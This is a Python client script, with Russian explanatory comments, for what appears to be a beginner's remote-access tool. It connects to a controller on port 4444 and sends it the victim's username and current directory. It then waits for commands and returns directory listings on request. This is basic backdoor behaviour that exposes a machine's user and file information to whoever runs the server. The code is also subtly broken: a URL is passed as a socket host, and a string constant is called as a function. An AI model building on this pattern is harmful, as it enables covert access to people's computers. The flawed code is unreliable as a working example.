import socket
import getpass
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = 'http://127.0.0.1:8000/'
port = 4444
s.connect((host, port))#с помощью метода connect мы 
#передаем 
#информацию в порт что мы хотим соединится
#запускаем сервер и клиента
#и как только соединение появилось
#(server.py строка 24)мы выводим на екран, что произошло соединение

current_user = getpass.getuser() #импортирукм getpass
s.send(current_user.encode())


current_user = os.path.abspath(os.curdir())
current_user = str(current_user) #переволим в строчный режим
s.send(current_user.encode()) #и енкодируем, далее(server.py строка 29)

#хапускаем сервак
while True: #делаем бесконечный цикл
    command = s.recv(1024) #данные команды которая к нам пришла
    command = command.decode()

    if command =='exit': #если равно екзит 
        break  #то выходим
     #запускаем сервак
 #с server.py  , здесь в client.py мы выходим когда отправляем
#команду екзит из server.py  и здесь он принял нашу команду, понял что 
#это екзит и вышел
    if command == 'ls':
        dir_search = s.recv(1024)#здесь создаем переменную и принимаем данные
        dir_search = dir_search.decode() #декодируем
        file_list = os.listdir(dir_search) #возвращаем список имен 
        #файлов в директории dir_search
        file_list = str(file_list)# преобразуем список файлов в стр
        s.send(file_list.encode())#преобразуем в  байты для передачи 
         #через сокет. переходим в сервер.py 52 строка